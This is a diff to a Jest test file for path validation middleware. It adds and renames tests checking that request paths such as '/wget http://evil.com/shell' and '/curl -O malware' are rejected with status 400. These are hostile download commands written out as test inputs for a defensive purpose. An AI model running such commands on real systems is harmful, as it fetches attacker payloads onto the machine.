@@ -152,8 +152,14 @@ describe('Path Validation Middleware', () => {
             expect(statusSpy).toHaveBeenCalledWith(400);
         });
 
-        test('should block common shell commands', () => {
+        test('should block shell command with arguments', () => {
             const mockReq = createMockReq('/wget http://evil.com/shell');
+            pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
+            expect(statusSpy).toHaveBeenCalledWith(400);
+        });
+
+        test('should block curl command', () => {
+            const mockReq = createMockReq('/curl -O malware');
             pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
             expect(statusSpy).toHaveBeenCalledWith(400);
         });
@@ -193,7 +199,7 @@ describe('Path Validation Middleware', () => {
         });
 
         test('should block .sh files', () => {
-            const mockReq = createMockReq('/shell.sh');
+            const mockReq = createMockReq('/script.sh');
             pathValidationMiddleware(mockReq as Request, mockRes as Response, nextFunction);
             expect(statusSpy).toHaveBeenCalledWith(400);
         });
